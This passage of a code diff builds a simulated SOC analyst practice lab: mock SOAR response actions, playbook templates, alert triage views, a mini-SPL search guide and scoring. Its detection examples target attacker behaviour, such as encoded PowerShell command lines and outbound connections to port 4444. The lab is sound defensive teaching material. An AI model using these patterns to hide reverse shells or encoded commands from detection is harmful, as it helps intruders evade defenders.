+ notify:{label:'Notify team (Mgmt / HR / Legal)',ph:'who? e.g. HR, Legal',cat:'Communicate'},
+ close_case:{label:'Close case',ph:'reason, e.g. benign – authorised scan',cat:'Communicate'}};
+const TEMPLATES={
+ 'Account compromise':['enrich_ip','block_ip','disable_user','reset_password','notify'],
+ 'Malware on endpoint':['check_hash','isolate_host','block_domain','block_ip','reset_password'],
+ 'Phishing response':['quarantine_email','block_domain','reset_password','enrich_ip'],
+ 'Data exfiltration':['lookup_user','block_domain','disable_user','notify'],
+ 'Web application attack':['enrich_ip','block_ip','revoke_sessions','create_ticket','notify'],
+ 'Ransomware':['isolate_host','disable_user','check_hash','restore_backup','notify'],
+ 'Benign / false positive':['enrich_ip','lookup_user','close_case']};
+const isIP=s=>/^\d{1,3}(\.\d{1,3}){3}$/.test(s);
+function execAction(a,p){const t=S.truth,P=p.trim(),pl=P.toLowerCase();if(!P)return['bad','✖ parameter required'];
+ const intel=Object.keys(t.intel).find(k=>k.toLowerCase()===pl||(pl.length>=8&&k.toLowerCase().startsWith(pl)));
+ switch(a){
+  case 'enrich_ip':if(!isIP(P))return['bad','✖ not a valid IPv4 address'];if(intel)return[t.intel[intel].startsWith('MALICIOUS')||t.intel[intel].startsWith('SUSPICIOUS')?'warn':'info','↳ '+t.intel[intel]];
+   if(ASSETS[P])return['info','↳ Internal asset: '+ASSETS[P]];if(P.startsWith('10.'))return['info','↳ Internal address, not in CMDB'];return['info','↳ No reputation hits. Looks like common cloud/CDN infrastructure.'];
+  case 'check_hash':if(!/^[a-f0-9]{8,64}$/i.test(P))return['bad','✖ not a hex hash'];if(intel)return['warn','↳ '+t.intel[intel]];
+   if(Object.values(PROC_HASH).some(h=>h.startsWith(pl)))return['info','↳ Known good — signed vendor binary (0/70)'];return['info','↳ Unknown file — 0/70 engines, never seen before'];
+  case 'lookup_user':if(PEOPLE[pl]){const x=PEOPLE[pl];return['info',`↳ ${pl}: ${x.title}, ${x.dept} dept · workstation ${x.host} (${x.ip}) · MFA: enabled`]}if(SERVICE[pl])return['info','↳ '+SERVICE[pl]];if(knownUser(pl))return['warn','↳ '+P+': account exists but has no owner / department info (created recently?)'];return['bad','✖ user not found in directory'];
+  case 'block_ip':if(!isIP(P))return['bad','✖ not a valid IPv4 address'];return[P.startsWith('10.')?'warn':'ok',`✔ FW-EDGE01: DENY any <-> ${P} (rule #${rnd(1000,9999)})`+(P.startsWith('10.')?'\n  ⚠ You blocked an INTERNAL address — business services may break.':'')];
+  case 'block_domain':if(!/\./.test(P)||isIP(P))return['bad','✖ not a domain'];return['ok',`✔ Proxy category set to BLOCK and DNS sinkhole added for ${P}`];
+  case 'isolate_host':return['ok',`✔ EDR network containment applied to ${P}. Host can only talk to the EDR console.`];
+  case 'disable_user':if(!knownUser(pl))return['bad','✖ user not found in directory'];return['ok',`✔ Account ${P} disabled; active sessions & tokens revoked`];
+  case 'reset_password':if(!knownUser(pl))return['bad','✖ user not found in directory'];return['ok',`✔ Password reset forced for ${P}; MFA re-registration required`];
+  case 'revoke_sessions':return['ok',`✔ All web/app sessions and refresh tokens revoked for ${P}`];
+  case 'restore_backup':return['ok',`✔ Restore of ${P} from last clean backup scheduled (after re-imaging)`];
+  case 'create_ticket':return['ok',`✔ Ticket INC-${rnd(10000,99999)} created → ${P}`];
+  case 'quarantine_email':{const n=S.events.filter(e=>e.sourcetype==='email'&&String(e.sender).toLowerCase().includes(pl)).length;return n?['ok',`✔ Purged ${n} message(s) from user mailboxes`]:['warn','↳ No messages matched that sender']}
+  case 'notify':return['ok',`✔ Notification sent to: ${P}`];
+  case 'close_case':return['ok',`✔ Case closed — reason: "${P}"`];}}
+
+/* ============ state ============ */
+let S=null,TAB='missions',LAST=null,LIMIT=100,FV=[];
+function knownUser(u){return !!(PEOPLE[u]||SERVICE[u]||(S&&S.events.some(e=>String(e.user).toLowerCase()===u||String(e.target_user).toLowerCase()===u)))}
+function baseState(extra){return Object.assign({rules:DEFAULT_RULES.map(r=>({...r,on:true,builtin:true})),alerts:[],triage:{},cls:{},steps:[{a:'enrich_ip',p:''}],executed:[],log:[],answers:{},verdict:'',notes:'',hints:0,result:null,query:'',started:Date.now()},extra)}
+function startMission(i){const sc=SCENARIOS[i],seed=(Date.now()%1e9)|0;R=mulberry32(seed);buildCustomers();
+ const n=noise(420).concat(webNoise(180)),g=sc.gen();
+ S=baseState({mode:'story',i,sc,seed,events:n.concat(g.events).sort((a,b)=>a._time-b._time),truth:g.truth});
+ runDetections(true);show('alerts')}
+/* multi-incident modes: 'owasp' | 'shift' | 'lib:<id>' */
+const MODES={owasp:{id:'owasp',name:'OWASP Top 10 Web Day',brief:'You are watching shop.company.example (SRV-WEB01) today. Web, WAF-style, EDR and auth logs are in the SIEM. Several web-application attacks — and maybe a harmless look-alike — are hidden in them. Triage every alert, classify each real one by attack type, respond, then submit.'},
+ shift:{id:'shift',name:'Random SOC Shift',brief:'A normal day on shift. Alerts from web, identity, endpoint, network and email are waiting — some are real incidents, some are false positives. Triage and classify every alert, respond to the real ones, and close the benign ones.'}};
+function startMulti(mode){const seed=(Date.now()%1e9)|0;R=mulberry32(seed);buildCustomers();
+ let defs;
+ if(mode==='owasp'){const tp=INC.filter(x=>x.cat==='OWASP'&&!x.fp).sort(()=>R()-.5).slice(0,4);defs=R()<.6?tp.concat(pick(INC.filter(x=>x.cat==='OWASP'&&x.fp))):tp}
+ else if(mode==='shift'){const tp=INC.filter(x=>!x.fp).sort(()=>R()-.5).slice(0,rnd(4,5));const fp=INC.filter(x=>x.fp).sort(()=>R()-.5).slice(0,rnd(1,2));defs=tp.concat(fp)}
+ else defs=[INC.find(x=>x.id===mode.slice(4))];
+ const usedIP=new Set(),usedU=new Set();
+ const c={ip(){let ip;do{ip=pick(['203.0.113.','198.51.100.','192.0.2.'])+rnd(2,253)}while(usedIP.has(ip));usedIP.add(ip);return ip},
+  user(list){const l=(list||Object.keys(PEOPLE)).filter(u=>!usedU.has(u));const u=pick(l.length?l:Object.keys(PEOPLE));usedU.add(u);return u},t:()=>rnd(12,80)};
+ const incs=defs.map((d,k)=>{const g=d.gen(c);g.events.forEach(e=>e._inc=k);return{def:d,g}});
+ let noiseEv=noise(420).concat(webNoise(180));incs.forEach(x=>{if(x.g.drop)noiseEv=noiseEv.filter(e=>!x.g.drop(e))});
+ const intel={};incs.forEach(x=>Object.assign(intel,x.g.intel));
+ const sc=mode.startsWith('lib:')?{id:mode,name:'Practice: '+defs[0].name,brief:defs[0].desc+' Investigate the alert(s), decide true or false positive, classify, respond and report.'}:MODES[mode];
+ S=baseState({mode:'multi',key:mode,sc,seed,incs,events:noiseEv.concat(...incs.map(x=>x.g.events)).sort((a,b)=>a._time-b._time),truth:{intel}});
+ runDetections(true);show('alerts')}
+function restart(){if(S.mode==='story')startMission(S.i);else startMulti(S.key)}
+function runDetections(silent){const out=[];for(const r of S.rules){if(!r.on)continue;let res;try{res=runQuery(r.q,S.events)}catch(e){r.err=e.message;continue}r.err='';
+  if(res.kind==='events'){if(res.rows.length)out.push(mkAlert(r,{},res.rows,res.rows.length))}
+  else res.rows.forEach(row=>{const by={};res.cols.slice(0,-1).forEach(c=>by[c]=row[c]);out.push(mkAlert(r,by,row._events||[],row[res.cols[res.cols.length-1]]))})}
+ S.alerts=out.sort((a,b)=>a.first-b.first);updateStatus();if(!silent)render()}
+function mkAlert(r,by,evs,metric){const times=evs.map(e=>e._time);const me=evs.find(e=>e._mal)||evs.find(e=>e._inc!=null);
+ return{id:r.id+'|'+JSON.stringify(by),rule:r,by,metric,count:evs.length,first:Math.min(...times),last:Math.max(...times),mal:evs.some(e=>e._mal),inc:me?me._inc:null,builtin:!!r.builtin}}
+function updateStatus(){$('#status').innerHTML=S?`<b style="color:var(--text)">${esc(S.sc.name)}</b> · case #${S.seed%10000}<br>${S.alerts.filter(a=>!S.triage[a.id]).length} untriaged alert(s)`:'No active mission';renderNav()}
+const TYPES_BY_CAT=(()=>{const o={};INC.filter(x=>!x.fp).forEach(x=>{(o[x.cat]=o[x.cat]||[]);if(!o[x.cat].includes(x.type))o[x.cat].push(x.type)});return o})();
+
+/* ============ views ============ */
+const TABS=[['missions','Missions'],['library','Alert Library'],['alerts','Alerts'],['search','SIEM Search'],['rules','Detections'],['soar','SOAR Playbooks'],['report','Report & Score'],['guide','Guide']];
+function renderNav(){const open=S?S.alerts.filter(a=>!S.triage[a.id]).length:0;$('#nav').innerHTML=TABS.map(([k,l])=>`<button data-t="${k}" class="${k===TAB?'on':''}" onclick="show('${k}')">${l}${k==='alerts'&&open?`<span class="badge">${open}</span>`:''}</button>`).join('')}
+function show(t){TAB=t;renderNav();render();window.scrollTo(0,0)}
+function render(){const v=$('#view');if(!S&&!['missions','guide','library'].includes(TAB)){v.innerHTML=`<div class="card"><h2>No active mission</h2><p class="muted">Pick a mission first — it loads ~500 log events into the SIEM.</p><button class="btn pri" onclick="show('missions')">Choose a mission</button></div>`;return}
+ v.innerHTML=VIEWS[TAB]();if(TAB==='search'&&S.query!==null)doSearch(true)}
+const VIEWS={
+missions(){const best=k=>store[k]!=null?'Best: <b style="color:var(--ok)">'+store[k]+'%</b>':'Not attempted';
+ return `<div class="card"><h1>SOC analyst practice lab</h1><p class="muted">A safe, fully simulated company + web shop. Every start generates fresh logs (web, firewall, auth, proxy, DNS, EDR, email) with hidden attacks — or false alarms. Work it like a real SOC analyst:</p>
+ <div class="flow"><div><b>1 · Detect</b>${DEFAULT_RULES.length} detection rules raise alerts</div><div><b>2 · Triage</b>True or false positive?</div><div><b>3 · Investigate</b>Hunt in the SIEM with queries</div><div><b>4 · Respond</b>Run a SOAR playbook</div><div><b>5 · Report</b>Get scored &amp; debriefed</div></div></div>
+ ${S?`<div class="card" style="border-color:var(--accent)"><div class="row"><div class="grow"><b>Active:</b> ${esc(S.sc.name)} · case #${S.seed%10000}</div><button class="btn" onclick="show('alerts')">Continue</button></div></div>`:''}
+ <h2 style="margin:18px 0 10px">Random practice — different alerts every time</h2>
+ <div class="grid two">
+ <div class="card mission"><div class="row"><h2 style="margin:0" class="grow">OWASP Top 10 Web Day</h2><span class="tag">Web · 2025 list</span></div><p>${MODES.owasp.brief}</p><p class="small muted">4 random attacks from ${INC.filter(x=>x.cat==='OWASP'&&!x.fp).length} OWASP scenarios (A01–A10), often plus a harmless look-alike.</p><div class="row"><span class="small muted grow">${best('owasp')}</span><button class="btn pri" onclick="startMulti('owasp')">Start</button></div></div>
+ <div class="card mission"><div class="row"><h2 style="margin:0" class="grow">Random SOC Shift</h2><span class="tag">Mixed</span></div><p>${MODES.shift.brief}</p><p class="small muted">4–5 real incidents + 1–2 false positives drawn from all ${INC.length} alert types.</p><div class="row"><span class="small muted grow">${best('shift')}</span><button class="btn pri" onclick="startMulti('shift')">Start</button></div></div></div>
+ <div class="card"><div class="row"><div class="grow"><b>Alert Library</b> — practise any of the ${INC.length} alert types on its own (OWASP, identity, endpoint, network, email).</div><button class="btn" onclick="show('library')">Open library</button></div></div>
+ <h2 style="margin:18px 0 10px">Story missions</h2>
+ <div class="grid two">${SCENARIOS.map((s,i)=>`<div class="card mission"><div class="row"><h2 style="margin:0" class="grow">${i+1}. ${esc(s.name)}</h2><span class="tag">${s.level}</span></div>
+ <div class="muted small">${esc(s.topic)}</div><p>${esc(s.brief)}</p><div class="row"><span class="small muted grow">${best(s.id)}</span><button class="btn pri" onclick="startMission(${i})">${S&&S.mode==='story'&&S.i===i?'Restart (new variant)':'Start mission'}</button></div></div>`).join('')}</div>
+ <p class="small muted">Every restart randomises IPs, users, domains and timing, so students can't copy answers. Best scores are saved in this browser only.</p>`},
+
+library(){const cats=['OWASP','Identity','Endpoint','Network','Email'],names={OWASP:'OWASP Top 10:2025 — web application attacks',Identity:'Identity & access',Endpoint:'Endpoint (EDR)',Network:'Network',Email:'Email'};
+ return `<div class="card"><h2>Alert Library</h2><p class="muted small">${INC.length} alert types. Each one is a reference card <i>and</i> a practice drill: press Practice to load only that incident (with investigation questions and hints). Items marked <span class="tag">false-positive drill</span> look suspicious but are benign.</p></div>
+ ${cats.map(ct=>`<h2 style="margin:18px 0 10px">${names[ct]}</h2><div class="grid two">${INC.filter(x=>x.cat===ct).map(x=>`<div class="card mission"><div class="row"><b class="grow">${esc(x.name)}</b>${x.fp?'<span class="tag">false-positive drill</span>':''}</div>
+ <div><span class="tag" style="color:var(--accent)">${esc(x.tag)}</span></div><p class="small">${esc(x.desc)}</p>
+ <div class="row"><span class="small muted grow">${store['lib:'+x.id]!=null?'Best: <b style="color:var(--ok)">'+store['lib:'+x.id]+'%</b>':''}</span><button class="btn sm pri" onclick="startMulti('lib:${x.id}')">Practice</button></div></div>`).join('')}</div>`).join('')}`},
+
+alerts(){const a=S.alerts;return `<div class="card"><h2>Mission brief — ${esc(S.sc.name)}</h2><p>${esc(S.sc.brief)}</p><p class="small muted">Log window: 2026-11-03 09:00–11:00 · ${S.events.length} events · ${a.length} alert(s)${S.mode==='multi'?' · Several alerts can belong to the same incident. For each true positive, also pick the attack type.':''}</p></div>
+ ${a.length?a.map((x,i)=>{const t=S.triage[x.id];return `<div class="card"><div class="row"><span class="sev ${x.rule.sev}">${x.rule.sev}</span><b class="grow">${esc(x.rule.name)}</b><span class="small muted mono">${fmtT(x.first)}–${fmtT(x.last)}</span></div>
+ <div class="mono small" style="margin:8px 0">${Object.entries(x.by).map(([k,v])=>`<span class="kv"><b>${esc(k)}</b>=${esc(v)}</span>`).join(' &nbsp;')||'(all)'} · ${x.count} event(s)${x.metric!==x.count?` · value ${esc(fmtV('bytes',x.metric))}`:''}</div>
+ <div class="row"><button class="btn sm" onclick="investigate(${i})">🔍 Investigate</button><span class="grow"></span><span class="small muted">Triage:</span>
+ <button class="btn sm ok ${t==='TP'?'sel':''}" onclick="triage(${i},'TP')">True positive</button><button class="btn sm bad ${t==='FP'?'sel':''}" onclick="triage(${i},'FP')">False positive</button></div>
+ ${S.mode==='multi'&&t==='TP'?`<div class="row" style="margin-top:8px"><span class="small muted">Attack type:</span><select class="grow" onchange="S.cls[S.alerts[${i}].id]=this.value;updateStatus()"><option value="">— classify this alert —</option>${Object.entries(TYPES_BY_CAT).map(([ct,ts])=>`<optgroup label="${ct}">${ts.map(ty=>`<option ${S.cls[x.id]===ty?'selected':''}>${esc(ty)}</option>`).join('')}</optgroup>`).join('')}</select></div>`:''}</div>`}).join(''):'<div class="card muted">No alerts. Try enabling or writing detection rules.</div>'}`},
+
+search(){return `<div class="card"><div class="row"><input id="q" class="mono grow" value="${esc(S.query)}" placeholder='sourcetype=auth action=failure | stats count by src_ip' onkeydown="if(event.key==='Enter')doSearch()"><button class="btn pri" onclick="doSearch()">Search</button></div>
+ <div class="chips">${EXAMPLES.map((e,i)=>`<button class="chip" onclick="setQ(${i})">${esc(e[0])}</button>`).join('')}</div></div><div id="res"></div>`},
+
+rules(){const cats=['Core','Web / OWASP','Identity','Endpoint','Network','Email','Custom'];const row=(r,i)=>`<div style="border-top:1px solid var(--line);padding:10px 0"><div class="row"><label class="toggle grow"><input type="checkbox" ${r.on?'checked':''} onchange="S.rules[${i}].on=this.checked"> <b>${esc(r.name)}</b></label><span class="sev ${r.sev}">${r.sev}</span>${r.builtin?'':`<button class="btn sm bad" onclick="S.rules.splice(${i},1);render()">Delete</button>`}</div>
+ <input class="mono" style="margin-top:6px" value="${esc(r.q)}" onchange="S.rules[${i}].q=this.value">${r.err?`<div class="small" style="color:var(--bad)">${esc(r.err)}</div>`:''}</div>`;
+ return `<div class="card"><h2>Detection rules (${S.rules.length})</h2><p class="muted small">Rules are saved searches. Any result row becomes an alert. Edit them, turn them off, or write your own — then re-run.</p>
+ ${cats.map(ct=>{const rs=S.rules.map((r,i)=>[r,i]).filter(([r])=>(r.cat||'Custom')===ct);return rs.length?`<details style="margin-top:8px"><summary style="cursor:pointer"><b>${ct}</b> <span class="small muted">${rs.filter(([r])=>r.on).length}/${rs.length} on</span></summary>${rs.map(([r,i])=>row(r,i)).join('')}</details>`:''}).join('')}
+ <button class="btn pri" style="margin-top:12px" onclick="runDetections();show('alerts')">Run detections</button></div>
+ <div class="card"><h2>Write a custom rule</h2><div class="grid two"><input id="rn" placeholder="Rule name, e.g. Connections to port 4444"><select id="rs"><option>high</option><option selected>medium</option><option>low</option></select></div>
+ <input id="rq" class="mono" style="margin-top:8px" placeholder="sourcetype=firewall dest_port=4444 | stats count by src_ip"><div class="row" style="margin-top:8px"><button class="btn" onclick="testRule()">Test</button><button class="btn pri" onclick="addRule()">Add rule</button><span id="rt" class="small muted"></span></div></div>`},
+
+
+soar(){return `<div class="grid two"><div><div class="card"><h2>Playbook builder</h2><p class="small muted">A SOAR playbook is an ordered list of automated actions. Fill in the target for each step, then run. <b>Actions are real in this simulation — they can't be undone.</b></p>
+ <div class="row" style="margin-bottom:10px"><select id="tpl" class="grow"><option value="">Load a starter template…</option>${Object.keys(TEMPLATES).map(k=>`<option>${k}</option>`).join('')}</select><button class="btn sm" onclick="loadTpl()">Load</button></div>
+ ${S.steps.map((s,i)=>`<div class="step"><div class="n">${i+1}</div><div><select onchange="S.steps[${i}].a=this.value;render()">${Object.entries(ACTIONS).map(([k,v])=>`<option value="${k}" ${k===s.a?'selected':''}>${v.cat} · ${v.label}</option>`).join('')}</select>
+ <input class="mono" style="margin-top:6px" placeholder="${esc(ACTIONS[s.a].ph)}" value="${esc(s.p)}" oninput="S.steps[${i}].p=this.value"><div class="ctl"><button class="btn sm" onclick="mv(${i},-1)">↑</button><button class="btn sm" onclick="mv(${i},1)">↓</button><button class="btn sm bad" onclick="S.steps.splice(${i},1);render()">Remove</button></div></div></div>`).join('')}
+ <div class="row"><button class="btn" onclick="S.steps.push({a:'enrich_ip',p:''});render()">+ Add step</button><span class="grow"></span><button class="btn pri" id="runbtn" onclick="runPlaybook()">▶ Run playbook</button></div></div></div>
+ <div><div class="card"><h2>Execution log</h2><div class="term" id="term">${S.log.join('\n')||'<span class="muted">No actions run yet.</span>'}</div></div>
+ <div class="card"><h2>Actions taken (${S.executed.length})</h2>${S.executed.length?S.executed.map(x=>`<div class="small mono">• ${esc(ACTIONS[x.a].label)} → ${esc(x.p)}</div>`).join(''):'<p class="muted small">None yet.</p>'}
+ <p class="small muted">Tip: investigation actions (enrich, check hash, look up user) are read-only and safe. Containment actions on the wrong target cost points.</p></div></div></div>`},
+
+report(){const t=S.truth;if(S.result)return resultView();if(S.mode==='multi')return reportMulti();return `<div class="card"><h2>Incident report</h2><p class="small muted">${esc(S.sc.brief)}</p>
+ ${t.questions.map(q=>`<label class="small">${esc(q.q)}</label><input class="mono" style="margin:4px 0 10px" value="${esc(S.answers[q.id]||'')}" oninput="S.answers['${q.id}']=this.value">`).join('')}
+ <label class="small">Final verdict</label><div class="row" style="margin:4px 0 10px"><button class="btn ok ${S.verdict==='TP'?'sel':''}" onclick="S.verdict='TP';render()">True positive — real incident</button><button class="btn bad ${S.verdict==='FP'?'sel':''}" onclick="S.verdict='FP';render()">False positive — benign</button></div>
+ <label class="small">Analyst notes (not scored — practise writing a summary)</label><textarea oninput="S.notes=this.value" placeholder="Timeline, root cause, actions taken, recommendations…">${esc(S.notes)}</textarea></div>
+ <div class="card"><h2>Hints <span class="small muted">(−5 points each)</span></h2>${t.hints.slice(0,S.hints).map(h=>`<div class="hint">💡 ${esc(h)}</div>`).join('')}${S.hints<t.hints.length?`<button class="btn sm" onclick="S.hints++;render()">Reveal hint ${S.hints+1}/${t.hints.length}</button>`:''}</div>
+ <div class="card"><p class="small muted">Before submitting: triaged all alerts? Ran your response playbook? (${S.alerts.filter(a=>!S.triage[a.id]).length} untriaged · ${S.executed.length} actions taken)</p><button class="btn pri" onclick="submitReport()">Submit report &amp; get score</button></div>`},
+
+guide(){return `<div class="card"><h2>What are SIEM and SOAR?</h2><p><b>SIEM</b> (Security Information &amp; Event Management) collects logs from across the network into one place so analysts can search them and run <i>detection rules</i> that raise alerts — e.g. Splunk, Microsoft Sentinel, Elastic, Wazuh, QRadar.</p>
+ <p><b>SOAR</b> (Security Orchestration, Automation &amp; Response) turns response steps into <i>playbooks</i> that run automatically across tools — enrich an IP, block it on the firewall, disable a user, isolate a laptop — e.g. Cortex XSOAR, Splunk SOAR, Shuffle, Tines.</p></div>
+ <div class="card"><h2>Query syntax (mini-SPL)</h2><table>
+ <tr><td>field=value</td><td>exact match, case-insensitive · <code>*</code> wildcard: <code>cmdline=*-enc*</code></td></tr>
+ <tr><td>field!=value · NOT field=value</td><td>exclude</td></tr><tr><td>bytes&gt;1000000</td><td>numeric compare (&gt; &lt; &gt;= &lt;=)</td></tr>
+ <tr><td>free text</td><td>any field contains it: <code>powershell</code></td></tr>
+ <tr><td>| stats count by f1, f2</td><td>group &amp; count · also <code>dc(field)</code>, <code>sum(field)</code>, <code>avg(field)</code></td></tr>
+ <tr><td>| where count &gt; 20</td><td>filter stats results (columns: count, dc, sum, avg)</td></tr>
+ <tr><td>| sort -count · | head 10</td><td>sort (− = descending) · limit</td></tr><tr><td>| table _time, user, url</td><td>choose columns</td></tr></table>
+ <p class="small muted">Terms are ANDed together. Tap a value under "Fields" in search results to add it as a filter.</p></div>
+ <div class="card"><h2>Log sources</h2><table><tr><th>sourcetype</th><th>key fields</th></tr>
+ <tr><td>auth</td><td>event, host, user, src_ip, action, country, target_user, group, service, encryption</td></tr><tr><td>firewall</td><td>src_ip, dest_ip, dest_port, direction, action, bytes</td></tr>
+ <tr><td>proxy</td><td>user, domain, url, method, category, action, bytes</td></tr><tr><td>dns</td><td>host, src_ip, query, answer</td></tr>
+ <tr><td>web</td><td>src_ip, method, uri, status, user, bytes, user_agent, scheme, response_ms, msg</td></tr><tr><td>edr</td><td>event, host, user, process, parent, cmdline, hash</td></tr><tr><td>email</td><td>sender, display_name, reply_to, recipient, subject, url, attachment</td></tr></table></div>
+ <div class="card"><h2>OWASP Top 10:2025 in this lab</h2><table><tr><th>#</th><th>Category</th><th>Practice scenario(s)</th></tr>${[['A01','Broken Access Control (incl. SSRF)','a01_idor,a01_trav,a01_ssrf'],['A02','Security Misconfiguration','a02_misconf'],['A03','Software Supply Chain Failures','a03_supply'],['A04','Cryptographic Failures','a04_crypto'],['A05','Injection','a05_sqli,a05_xss'],['A06','Insecure Design','a06_design'],['A07','Authentication Failures','a07_stuff'],['A08','Software or Data Integrity Failures','a08_deser'],['A09','Security Logging & Alerting Failures','a09_logs'],['A10','Mishandling of Exceptional Conditions','a10_except']].map(([n,c,ids])=>`<tr><td>${n}</td><td>${c}</td><td>${ids.split(',').map(id=>{const x=INC.find(i=>i.id===id);return `<a href="#" style="color:var(--accent)" onclick="event.preventDefault();startMulti('lib:${id}')">${esc(x.name)}</a>`}).join('<br>')}</td></tr>`).join('')}</table>
+ <p class="small muted">Web logs (sourcetype=web) come from SRV-WEB01 / shop.company.example. In real SOCs these come from the web server, reverse proxy or WAF.</p></div>
+ <div class="card"><h2>Scoring</h2><p class="small">Investigation answers 10 each · correct verdict 20 (story missions) · each built-in alert triaged correctly 5 · each true-positive alert classified correctly 5 (random modes) · each required response action 10 · each recommended action 5 · harmful action −15 · blocking an internal IP −10 · each hint −5.</p></div>
+ <div class="card"><h2>For instructors</h2><p class="small">Have students write a custom rule that would catch the attack earlier (e.g. outbound to port 4444, or emails with double-extension attachments), then justify each playbook step in their notes. Run "Noisy Neighbor" last — it tests whether students verify before blocking. Because every restart randomises the data, students can work the same mission side by side and still have different answers.</p></div>`}
+};
+
+const EXAMPLES=[['Events by source','| stats count by sourcetype'],['Web status codes','sourcetype=web | stats count by status'],['Web top URIs','sourcetype=web | stats count by uri | sort -count | head 15'],['Web clients','sourcetype=web | stats count by src_ip, user_agent | sort -count | head 15'],['Failed logins','sourcetype=auth action=failure | stats count by src_ip, user | sort -count'],['Top DNS queries','sourcetype=dns | stats count by query | sort -count | head 10'],['Outbound volume','sourcetype=firewall direction=outbound | stats sum(bytes) by src_ip | sort -sum | head 10'],['Processes','sourcetype=edr | table _time, host, user, process, parent, cmdline'],['Emails','sourcetype=email | table _time, sender, recipient, subject'],['Proxy categories','sourcetype=proxy | stats count by category']];
+function setQ(i){S.query=EXAMPLES[i][1];$('#q').value=S.query;doSearch()}
+function doSearch(keep){const q=$('#q');if(!q)return;S.query=q.value;if(!keep)LIMIT=100;const out=$('#res');
+ try{LAST=runQuery(S.query,S.events);out.innerHTML=renderResult(LAST)}catch(e){out.innerHTML=`<div class="card err">Query error: ${esc(e.message)}</div>`}}
+function renderResult(r){if(r.kind==='table'){const cols=r.cols;return `<div class="card"><div class="small muted">${r.rows.length} row(s)</div><div style="overflow-x:auto"><table><tr>${cols.map(c=>`<th>${esc((r.label&&r.label[c])||c)}</th>`).join('')}</tr>${r.rows.slice(0,LIMIT).map(row=>`<tr>${cols.map(c=>`<td>${esc(fmtV(c,row[c]))}</td>`).join('')}</tr>`).join('')}</table></div>${r.rows.length>LIMIT?`<button class="btn sm" style="margin-top:8px" onclick="LIMIT+=100;$('#res').innerHTML=renderResult(LAST)">Show more</button>`:''}</div>`}
+ const ev=r.rows,b=new Array(12).fill(0);ev.forEach(e=>{const k=Math.min(11,Math.max(0,Math.floor((e._time-BASE)/600000)));b[k]++});const mx=Math.max(1,...b);
+ FV=[];const FIELDS=['sourcetype','host','user','src_ip','dest_ip','dest_port','action','event','uri','status','user_agent','scheme','domain','query','process','parent','sender','category','country'];
+ const fields=FIELDS.map(f=>{const c={};ev.forEach(e=>{if(e[f]!=null)c[e[f]]=(c[e[f]]||0)+1});const top=Object.entries(c).sort((a,b)=>b[1]-a[1]).slice(0,6);return top.length?`<details><summary>${f} (${Object.keys(c).length})</summary>${top.map(([v,n])=>{FV.push([f,v]);return `<div class="fv" onclick="addF(${FV.length-1})"><span>${esc(v)}</span><span class="muted">${n}</span></div>`}).join('')}</details>`:''}).join('');
+ return `<div class="card"><div class="small muted">${ev.length} event(s) · 09:00–11:00</div><div class="hist">${b.map(n=>`<div style="height:${n/mx*100}%" title="${n}"></div>`).join('')}</div><div class="histl"><span>09:00</span><span>10:00</span><span>11:00</span></div></div>
+ <div class="grid side"><details class="card fields" ${innerWidth>820?'open':''}><summary><b style="color:var(--accent)">Fields</b> <span class="small muted">tap a value to filter</span></summary>${fields||'<span class="muted small">—</span>'}</details><div class="card">${ev.slice(0,LIMIT).map(evRow).join('')||'<span class="muted">No matching events.</span>'}${ev.length>LIMIT?`<button class="btn sm" style="margin-top:8px" onclick="LIMIT+=100;$('#res').innerHTML=renderResult(LAST)">Show more (${ev.length-LIMIT} left)</button>`:''}</div></div>`}
+function evRow(e){const ks=Object.keys(e).filter(k=>k[0]!=='_'&&k!=='sourcetype');return `<details class="ev"><summary><span class="t">${fmtT(e._time)}</span> <span class="st st-${e.sourcetype}">${e.sourcetype}</span> ${ks.slice(0,6).map(k=>`<span class="kv"><b>${k}</b>=${esc(fmtV(k,e[k]))}</span>`).join(' ')}</summary><div class="full">${ks.map(k=>`<div><b style="color:#9fb3d9">${k}</b> = ${esc(fmtV(k,e[k]))}</div>`).join('')}</div></details>`}
+function addF(i){const[f,v]=FV[i];const q=$('#q');const parts=q.value.split('|');parts[0]=(parts[0].trim()+` ${f}="${v}"`).trim()+' ';q.value=parts.join('|').trim();doSearch()}
+function investigate(i){const a=S.alerts[i];S.query=(a.rule.q.split('|')[0].trim()+' '+Object.entries(a.by).map(([k,v])=>`${k}="${v}"`).join(' ')).trim();show('search')}
+function triage(i,v){const a=S.alerts[i];S.triage[a.id]=S.triage[a.id]===v?undefined:v;updateStatus();render()}
+function testRule(){const q=$('#rq').value;try{const r=runQuery(q,S.events);$('#rt').textContent=`→ would create ${r.kind==='table'?r.rows.length:(r.rows.length?1:0)} alert(s)`}catch(e){$('#rt').textContent='Error: '+e.message}}
+function addRule(){const n=$('#rn').value.trim()||'Custom rule',q=$('#rq').value.trim();if(!q){$('#rt').textContent='Enter a query';return}try{runQuery(q,S.events)}catch(e){$('#rt').textContent='Error: '+e.message;return}
+ S.rules.push({id:'C'+Date.now(),name:n,sev:$('#rs').value,q,on:true,builtin:false});runDetections(true);render()}
+function mv(i,d){const j=i+d;if(j<0||j>=S.steps.length)return;[S.steps[i],S.steps[j]]=[S.steps[j],S.steps[i]];render()}
+function loadTpl(){const k=$('#tpl').value;if(!k)return;S.steps=TEMPLATES[k].map(a=>({a,p:''}));render()}
+function runPlaybook(){const steps=S.steps.filter(s=>s.a);if(!steps.length)return;const btn=$('#runbtn');btn.disabled=true;
+ const ts=()=>fmtT(BASE+7200000+(Date.now()-S.started));S.log.push(`<span class="info">[${ts()}] ▶ Playbook started (${steps.length} steps)</span>`);paintLog();
+ let i=0;(function next(){if(i>=steps.length){S.log.push(`<span class="info">[${ts()}] ■ Playbook finished</span>`);paintLog();setTimeout(()=>{if(TAB==='soar')render()},300);return}
+  const s=steps[i++];const[cls,msg]=execAction(s.a,s.p);S.log.push(`[${ts()}] ${esc(ACTIONS[s.a].label)} (${esc(s.p||'—')})\n<span class="${cls}">${esc(msg)}</span>`);
+  if(cls!=='bad')S.executed.push({a:s.a,p:s.p.trim()});paintLog();setTimeout(next,450)})()}
+function paintLog(){const t=$('#term');if(t){t.innerHTML=S.log.join('\n');t.scrollTop=t.scrollHeight}}
+
+/* ============ grading ============ */
+function reportMulti(){const single=S.incs.length===1,un=S.alerts.filter(a=>!S.triage[a.id]).length,ucl=S.alerts.filter(a=>S.triage[a.id]==='TP'&&!S.cls[a.id]).length;
+ return `<div class="card"><h2>Shift report — ${esc(S.sc.name)}</h2><p class="small muted">${esc(S.sc.brief)}</p>
